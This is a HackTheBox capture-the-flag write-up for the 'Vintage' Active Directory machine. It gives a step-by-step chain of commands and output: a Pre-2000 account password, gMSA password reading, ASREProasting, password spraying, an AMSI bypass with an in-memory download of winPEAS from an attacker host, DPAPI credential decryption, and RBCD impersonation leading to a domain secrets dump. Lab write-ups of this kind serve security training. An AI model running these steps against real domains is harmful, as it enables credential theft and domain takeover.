---
title: Vintage
published: 2025-01-15
description: '
Vintage is a challenging Active Directory machine characterized by disabled NTLM authentication, enabled antivirus protection, and complex security configurations. The machine involves exploiting a Pre-2000 computer account, leveraging multiple ACL/ACE vulnerabilities, decrypting Data Protection API (DPAPI) secrets, and manipulating Resource-Based Constrained Delegation.
'
image: /banner/vintage.png
tags: [Windows, Hard, Active Directory, Pre2K, Kerberos, DPAPI, GenericWrite, GenericAll, Targeted ASREProasting, RBCD]
category: 'HackTheBox'
draft: false
lang: 'en'
---

# Description

Vintage is a challenging Active Directory machine characterized by disabled NTLM authentication, enabled antivirus protection, and complex security configurations. The machine involves exploiting a Pre-2000 computer account, leveraging multiple ACL/ACE vulnerabilities, decrypting Data Protection API (DPAPI) secrets, and manipulating Resource-Based Constrained Delegation.

# Recon

## nmap

`nmap` shows open ports that are common on a Domain Controller machine.

```bash
# Nmap 7.95 scan initiated Tue Jan 14 17:05:51 2025 as: nmap -p- -T4 -sSCV -vv -oN nmap.txt 10.10.11.45
Nmap scan report for 10.10.11.45 (10.10.11.45)
Host is up, received echo-reply ttl 127 (0.085s latency).
Scanned at 2025-01-14 17:05:51 WIB for 1165s
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-01-14 10:08:03Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
60376/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
60381/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
60401/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

It reveals the hostname `DC01` and the domain `vintage.htb`, make sure to add those and the FQDN to `/etc/hosts`.

```bash
10.10.11.45 dc01.vintage.htb dc01 vintage.htb
```

# Auth as p.rosa

## Enumeration

### Shares

With the given credentials `P.Rosa:Rosaisbest123`, we could try to check our current access level.

```bash
❯ nxc smb vintage.htb -u P.Rosa -p Rosaisbest123 --shares
SMB         10.10.11.45     445    10.10.11.45      [*]  x64 (name:10.10.11.45) (domain:10.10.11.45) (signing:True) (SMBv1:False)
SMB         10.10.11.45     445    10.10.11.45      [-] 10.10.11.45\P.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED
```

The `STATUS_NOT_SUPPORTED` response could be anything, but it looks like NTLM authentication is disabled, so let's try with Kerberos.
Add the domain to `/etc/krb5.conf`.

```bash
[libdefaults]
        default_realm = VINTAGE.HTB
        dns_lookup_kdc = true
        dns_lookup_realm = true
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
        fcc-mit-ticketflags = true

[realms]
...
        VINTAGE.HTB = {
                kdc = dc01.vintage.htb
                admin_server = dc01.vintage.htb
        }
...

[domain_realm]
        vintage.htb = VINTAGE.HTB
        .vintage.htb = VINTAGE.HTB
```

Let's get the TGT.

```bash
# Syncronize your date
sudo ntpdate vintage.htb
getTGT.py -dc-ip 10.10.11.45 vintage.htb/P.Rosa:Rosaisbest123
```

You need to use the machine FQDN `dc01.vintage.htb` if you're using kerberos authentication.

```bash
❯ export KRB5CCNAME=$(realpath P.Rosa.ccache)
❯ nxc smb dc01.vintage.htb --use-kcache --shares
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\P.Rosa from ccache
SMB         dc01.vintage.htb 445    dc01             [*] Enumerated shares
SMB         dc01.vintage.htb 445    dc01             Share           Permissions     Remark
SMB         dc01.vintage.htb 445    dc01             -----           -----------     ------
SMB         dc01.vintage.htb 445    dc01             ADMIN$                          Remote Admin
SMB         dc01.vintage.htb 445    dc01             C$                              Default share
SMB         dc01.vintage.htb 445    dc01             IPC$            READ            Remote IPC
SMB         dc01.vintage.htb 445    dc01             NETLOGON        READ            Logon server share
SMB         dc01.vintage.htb 445    dc01             SYSVOL          READ            Logon server share
```

Nothing special going on here, just bunch of default shares.

### Users

Don't forget to retrieve the user list from this machine, it might be useful later.

```bash
nxc smb dc01.vintage.htb --use-kcache --users | awk '{print $5}' | tail -n +4 | head -n -1 > users.txt
```

### bloodhound

I will use `rusthound-ce` to remotely collect information from the domain.

```bash
rusthound-ce -d vintage.htb -f dc01.vintage.htb -k -z -c All
```

Now load those json files into `bloodhound` and start analyzing potential attack paths.

<p align="center">
  <img src="/machines/vintage/pre2k_fs01.png" alt="Pre-Windows 2000 computers" />
</p>

Unfortunately, `P.Rosa` doesn't have any `Outbound Object Control` or belongs to interesting groups.
But `PRE-WINDOWS 2000 COMPATIBLE ACCESS` group has a computer account as its member which is interesting.

:::tip[Theory]
When a new computer account is configured as "pre-Windows 2000 computer", its password is set based on its name (i.e. lowercase computer name without the trailing `$`). When it isn't, the password is randomly generated.
:::

According to [Pre-Windows 2000 computers](https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers#pre-windows-2000-computers), the password for the computer account is the lowercase computer name without the trailing `$` if it hasn't been changed.

# Auth as fs01$

## Validate Pre2k machine creds

And `FS01\$:fs01` is a valid credentials.

```bash
getTGT.py -dc-ip 10.10.11.45 vintage.htb/FS01\$:fs01
```

## Enumeration

## ReadGMSAPassword

<p align="center">
  <img src="/machines/vintage/gmsa01.png" alt="GMSA01$ computer" />
</p>

From `FS01$`, we could [ReadGMSAPassword](https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword) of `GMSA01$` computer account.

I will use `bloodyAD` to read `msDS-ManagedPassword` attribute of `GMSA01$` computer account.

```bash
export KRB5CCNAME=$(realpath FS01\$.ccache)
bloodyAD -d vintage.htb -k --dc-ip 10.10.11.45 --host dc01.vintage.htb get object GMSA01\$ --attr msDS-ManagedPassword
```

# Auth as gmsa01$

## Enumeration

<p align="center">
  <img src="/machines/vintage/gmsa01_acl.png" alt="GMSA01$ ACL" />
</p>

`GMSA01$` has `GenericWrite` permissions on the `SERVICEMANAGERS` group, which in turn grants `AddSelf` as well.

<p align="center">
  <img src="/machines/vintage/servicemanagers_acl.png" alt="SERVICEMANAGERS ACL" />
</p>

Interestingly, the `SERVICEMANAGERS` group has a `GenericAll` permissions on the `SVC_ARK`, `SVC_LDAP`, and `SVC_SQL` users. However, there is no clear path forward from here, so let's focus on what we can do first.

Get yourself a TGT for `GMSA01$` computer account.

```bash
getTGT.py -dc-ip 10.10.11.45 vintage.htb/gmsa01\$ -hashes ":<NTHash>"
export KRB5CCNAME=$(realpath gmsa01\$.ccache)
```

## GenericWrite

Add ourselves to the `SERVICEMANAGERS` group.

```bash
bloodyAD -d vintage.htb -k --dc-ip 10.10.11.45 --host dc01.vintage.htb add groupMember SERVICEMANAGERS gmsa01\$
```

Get a new TGT.

```bash
getTGT.py -dc-ip 10.10.11.45 vintage.htb/gmsa01\$ -hashes ":<NTHash>"
```

## GenericAll

Because of the `GenericAll` permissions, we could change their passwords but the account itself doesn't have any permissions that we can exploit further.
We could make these user vulnerable to [ASREProasting](https://www.thehacker.recipes/ad/movement/kerberos/asreproast) or launch [Targeted Kerberoasting](https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting#targeted-kerberoasting) attacks.
I will just make it vulnerable to [ASREProasting](https://www.thehacker.recipes/ad/movement/kerberos/asreproast) attacks by setting the `DONT_REQ_PREAUTH` flag on these users.

<p align="center">
  <img src="/machines/vintage/svc_sql_disabled.png" alt="SVC_SQL disabled" />
</p>

The `SVC_SQL` user is disabled, so we need to enabled it so that we can get the `AS-REP` response.

When I was solving this machine, I used `bloodyAD` to edit the `userAccountControl` attribute, but for some reason, it didn't work while I was writing this post and I had to use `ldapmodify` instead.
You can try the following `bloodyAD` if you want to try it.

```bash
bloodyAD -d vintage.htb -k --dc-ip 10.10.11.45 --host dc01.vintage.htb add uac svc_ark -f DONT_REQ_PREAUTH
bloodyAD -d vintage.htb -k --dc-ip 10.10.11.45 --host dc01.vintage.htb add uac svc_ldap -f DONT_REQ_PREAUTH
bloodyAD -d vintage.htb -k --dc-ip 10.10.11.45 --host dc01.vintage.htb add uac svc_sql -f DONT_REQ_PREAUTH

# Enable svc_sql user
bloodyAD  -d vintage.htb -k --dc-ip 10.10.11.45 --host dc01.vintage.htb remove uac svc_sql -f ACCOUNTDISABLE
```

For using `ldapmodify` to edit the `userAccountControl` attribute, you need to grab the current `userAccountControl` value of enabled user then add it with `4194304` according to [Microsoft Docs](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties) for `DONT_REQ_PREAUTH`.
You can use the following command to get the `userAccountControl` value.

```bash
ldapsearch -H ldap://dc01.vintage.htb/ -Y GSSAPI -b "DC=vintage,DC=htb" "(sAMAccountName=svc_ark)" userAccountControl
```

The value of `userAccountControl` should be `66048` for `svc_ark` user, so we need to replace it with `66048 + 4194304` which is `4260352`. Then, you need to prepare a ldif file to modify the `userAccountControl` attribute.
I use the following ldif file to modify the `userAccountControl` attribute of `svc_ark`, `svc_ldap`, and `svc_sql` users.

```bash
dn: CN=svc_ark,OU=Pre-Migration,DC=vintage,DC=htb
changetype: modify
replace: userAccountControl
userAccountControl: 4260352

dn: CN=svc_ldap,OU=Pre-Migration,DC=vintage,DC=htb
changetype: modify
replace: userAccountControl
userAccountControl: 4260352

dn: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
changetype: modify
replace: userAccountControl
userAccountControl: 4260352
```

Then, you can use `ldapmodify` to modify the `userAccountControl` attribute.

```bash
ldapmodify -H ldap://dc01.vintage.htb/ -Y GSSAPI -f enable_plus_dont_req_preauth.ldif
```

After that, you can ASREProast them and crack their hashes.

```bash
GetNPUsers.py vintage.htb/gmsa01\$ -k -no-pass -dc-host dc01.vintage.htb -request -format hashcat -outputfile asrep_hash.txt
hashcat asrep_hash.txt <path_to_rockyou.txt>
```

If no one has changed the passwords for `svc_ark` or `svc_ldap`, you should only be able to crack the hash for `svc_sql`.
With the password cracked, we could spary this password with the users list we got earlier.

```bash
❯ kerbrute passwordspray -d vintage.htb --dc dc01.vintage.htb users.txt '<svc_sql_password>'

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 02/17/25 - Ronnie Flathers @ropnop

2025/02/17 23:11:12 >  Using KDC(s):
2025/02/17 23:11:12 >   dc01.vintage.htb:88

2025/02/17 23:11:13 >  [+] VALID LOGIN:  svc_sql@vintage.htb:<svc_sql_password>
2025/02/17 23:11:13 >  [+] VALID LOGIN:  C.Neri@vintage.htb:<svc_sql_password>
2025/02/17 23:11:13 >  Done! Tested 14 logins (2 successes) in 0.426 seconds
```

Looks like the password works for the `C.Neri` user as well. Let's see what this user has access to.

<p align="center">
  <img src="/machines/vintage/cneri_group.png" alt="c.neri group" />
</p>

Because this user belongs to the `Remote Management Users` group, we could log in using WinRM.

# Auth as c.neri

## User Flag

```bash
getTGT.py -dc-ip 10.10.11.45 vintage.htb/c.neri:<c.neri_password>
export KRB5CCNAME=$(realpath c.neri.ccache)
Machines/Hard/Vintage on  main [!?]
❯ evil-winrm -i dc01.vintage.htb -r vintage.htb

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\C.Neri\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\C.Neri\Desktop> cat user.txt
deadbeefc3fe5f808b096feb00b0fake
*Evil-WinRM* PS C:\Users\C.Neri\Desktop>
```

## Enumeration

```powershell
*Evil-WinRM* PS C:\Users\C.Neri> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ==============================================
vintage\c.neri S-1-5-21-4024337825-2033394866-2055507597-1115


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
VINTAGE\ServiceManagers                     Group            S-1-5-21-4024337825-2033394866-2055507597-1137 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Unfortunately, this user doesn't have any elevated privileges or belong to any interesting groups.

<p align="center">
  <img src="/machines/vintage/windef.png" alt="window defender" />
</p>

One thing I noticed is that the Windows Defender is enabled, so we can't just blatanlty run malicious programs.
To partially bypass Windows Defender, we need to bypass the ASMI. We could use `Bypass-4MSI` command from `evil-winrm` to bypass the ASMI.
After that, we could run `winPEASany_ofs.exe` by not touching the disk because AMSI works on the memory level and by using `Bypass-4MSI` command, we should be able to bypass the AMSI on .NET level.

```powershell
Bypass-4MSI
$data=(New-Object System.Net.WebClient).DownloadData('http://10.10.14.154:8000/winPEASany_ofs.exe');
$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
$out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter);
[winPEAS.Program]::Main("");[Console]::SetOut($out);$sWriter.ToString()
```

## Saved Credentials

Unfortunately, WinPEAS didn’t provide any useful information. Another thing we should check is saved credentials. It's usually stored in `C:\Users\<username>\AppData\Roaming\Microsoft\Credentials\` folder.
To see the contents of this folder, we need to use `Get-ChildItem -Force` command to list all files in this folder.

```powershell
*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials> Get-ChildItem -Force


    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   5:08 PM            430 C4BB96844A5C9DD45D5B6A9859252BA6
```

In this case, we can see that there is a file named `C4BB96844A5C9DD45D5B6A9859252BA6` which is the credentialblob. We could use this guide from [Mimikatz](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials) to decrypt it using DPAPI.
Because Windows Defender is enabled, we can't just run `mimikatz` command, so we need to decrypt it from our machine using tools like `dpapi.py` from `impacket` or [pypykatz](https://github.com/skelsec/pypykatz). I will use the former one, but let's download it first using `download C4BB96844A5C9DD45D5B6A9859252BA6` command from `evil-winrm`.
Ignore the error message after running the command, the file will be available in the current directory where you ran `evil-winrm`. After that, run the follwing command to view the content of the credential file and grab the `Guid MasterKey`.

```bash
dpapi.py credential -f C4BB96844A5C9DD45D5B6A9859252BA6
```

Next, we need to get the current user's SID using `whoami /all` and download the masterkey at `C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>\<GUIDMasterKey>` file. Use the following command to decrypt the masterkey file and get the key for decrypting the credential file.

```bash
dpapi.py masterkey -sid <SIOD -f <masterkey_file> -password <password>
```

```bash
dpapi.py credential -f C4BB96844A5C9DD45D5B6A9859252BA6 -key <key>
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affil
iated companies

[CREDENTIAL]
LastWritten : 2024-06-07 15:08:23+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=admin_acc
Description :
Unknown     :
Username    : vintage\c.neri_adm
Unknown     : <password>
```

And we can see that it contains the password for the `c.neri_adm` user.

# Auth as c.neri_adm

## RBCD

<p align="center">
  <img src="/machines/vintage/cneriadm_attack.png" alt="c.neri.adm attack" />
</p>

As you can see, the `c.neri_adm` user belongs to the `DELEGATEDADMINS` group that is `AllowedToAct` on the `DC01` computer. The `c.neri_adm` user has `GenericWrite` permissions on the `DELEGATEDADMINS` group, so we can add other users to the `DELEGATEDADMINS` group.
This means any user that belongs to the `DELEGATEDADMINS` group could act as `DC01$` ([RBCD](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)) if they meet the requirement for issuing a service ticket about the following :

- a user account having a `ServicePrincipalName` set
- an account with a trailing `$` in the `sAMAccountName` (i.e. a computer accounts)
- any other account and conduct SPN-less RBCD with U2U (User-to-User) authentication

We could use either `fs01$` or `gmsa01$` for the RBCD attack. I will use `gmsa01$` for this attack.
Let's add `gmsa01$` to the `DELEGATEDADMINS` group.

```bash
getTGT.py -dc-ip 10.10.11.45 vintage.htb/c.neri_adm:<password>
export KRB5CCNAME=$(realpath c.neri_adm.ccache)
bloodyAD -d vintage.htb -k --dc-ip 10.10.11.45 --host dc01.vintage.htb add groupMember DELEGATEDADMINS gmsa01\$
```

Impersonate the highest privileged user in the domain that is a user belonging to the `ADMINISTRATORS`, `Domain Admins`, or `Enterprise Admins` groups.

<p align="center">
  <img src="/machines/vintage/admins.png" alt="admins" />
</p>

I have tried to impersonate `Administrator` user, but it didn't work when trying to `secretsdump`. I will try to impersonate `l.bianchi_adm` user instead.

```bash
# Get GMSA01$
getTGT.py -dc-ip 10.10.11.45 vintage.htb/gmsa01\$ -hashes "<NTHash>"
export KRB5CCNAME=$(realpath gmsa01\$.ccache)

# RBCD
getST.py -spn 'cifs/dc01.vintage.htb' -impersonate l.bianchi_adm -dc-ip 'dc01.vintage.htb' 'vintage.htb/gmsa01$' -k -no-pass

# Dump secrets
export KRB5CCNAME=$(realpath l.bianchi_adm@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache)
secretsdump.py vintage.htb/l.bianchi_adm@dc01.vintage.htb -k -no-pass -just-dc
```

# Auth as l.bianchi_adm

## Root flag

Because the `Administrator` user ticket didn't work, just use `l.bianchi_adm` user to read the flag at `C:\Users\Administrator\Desktop\root.txt` because this user belongs to the `Administrators` group anyway.

```bash
getTGT.py -dc-ip 10.10.11.45 vintage.htb/l.bianchi_adm -hashes "<NTHash>"
export KRB5CCNAME=$(realpath l.bianchi_adm.ccache)
❯ evil-winrm -i dc01.vintage.htb -r vintage.htb

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\L.Bianchi_adm\Documents> cd ../../Administrator/Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
deadbeeff27998d688d8f7d9e5befake
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```
